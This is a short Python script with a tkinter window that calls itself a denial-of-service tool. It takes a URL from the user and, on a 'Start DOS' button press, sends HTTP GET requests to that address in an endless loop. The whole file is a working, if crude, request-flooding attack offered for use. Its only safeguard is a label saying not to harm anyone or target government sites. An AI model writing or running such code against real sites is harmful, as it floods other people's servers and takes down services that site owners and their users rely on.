from tkinter import *
import tkinter.messagebox as tmsg
import requests as r
class gui(Tk):
	def __init__(self):
		super().__init__()	
		self.a=StringVar()
		self.a.set('http://')
	def dos(self):
		self.lab=Label(self,text="DOS!\ndeniel of servics",font="lucida 20 bold",fg="red",bg="black")
		self.lab.pack()
		self.ent=Entry(self,textvar=self.a,font="lucida 12 bold")
		self.ent.pack()
		self.lab2=Label(self,text="don't use it to harm someone\ndo not try with goverment sites",font="lucida 10",bg="black",fg='red')
		self.lab2.pack()
	def danger(self):
		try:
			while True:
				a=r.get(self.a.get())
		except:
			tmsg.showerror('connection error 30','network not connected\nplease try again\nor unknown host')
	def but(self):
		self.button=Button(self,text="Start DOS",bg="red",font="lucida 15 bold",command=self.danger)
		self.button.pack(side="bottom")
a=gui()
a.dos()
a.but()
a.config(bg="black")
a.mainloop()